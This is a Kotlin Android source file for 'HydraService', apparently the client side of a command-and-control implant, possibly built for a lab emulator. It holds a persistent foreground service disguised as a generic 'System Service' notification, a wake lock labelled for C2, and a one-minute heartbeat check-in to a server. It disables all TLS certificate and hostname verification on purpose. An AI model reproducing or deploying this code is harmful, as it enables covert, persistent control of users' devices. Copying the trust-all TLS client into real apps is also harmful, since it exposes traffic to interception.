package com.hydra.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.*

class HydraService : Service() {
    private val TAG = "Hydra"
    private val client = unsafeOkHttpClient()
    private val handler = Handler(Looper.getMainLooper())
    private val heartbeatInterval = 60000L // 1 minute
    private var wakeLock: PowerManager.WakeLock? = null

    private val checkInRunnable = object : Runnable {
        override fun run() {
            Log.d(TAG, "Executing scheduled heartbeat...")
            performCheckIn()
            handler.postDelayed(this, heartbeatInterval)
        }
    }

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hydra::C2WakeLock")
        wakeLock?.acquire(10 * 60 * 1000L)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Ghost Service Started - Heartbeat active")
        
        // Promote to foreground to prevent the OS from killing the service
        startMyForegroundService()
        
        handler.removeCallbacks(checkInRunnable)
        handler.post(checkInRunnable)
        
        return START_STICKY
    }

    private fun startMyForegroundService() {
        val channelId = "hydra_c2_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Hydra System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Hydra connectivity active")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("System Service")
                .setContentText("Hydra connectivity active")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build()
        }

        startForeground(1, notification)
    }

    private fun performCheckIn() {
        val url = "https://10.0.2.2:8443/checkin/ANDROID-HEAD-01?platform=android"
        val body = "{}".toRequestBody("application/json".toMediaType())
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Heartbeat failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i(TAG, "Heartbeat successful: ${response.code}")
                } else {
                    Log.w(TAG, "Server rejected heartbeat: ${response.code}")
                }
                response.close()
            }
        })
    }

    override fun onDestroy() {
        Log.w(TAG, "Service being destroyed. Cleaning up...")
        handler.removeCallbacks(checkInRunnable)
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun unsafeOkHttpClient(): OkHttpClient {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })

        val sslContext = SSLContext.getInstance("SSL")
        sslContext.init(null, trustAllCerts, SecureRandom())

        return OkHttpClient.Builder()
            .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
            .hostnameVerifier { _, _ -> true }
            .build()
    }
}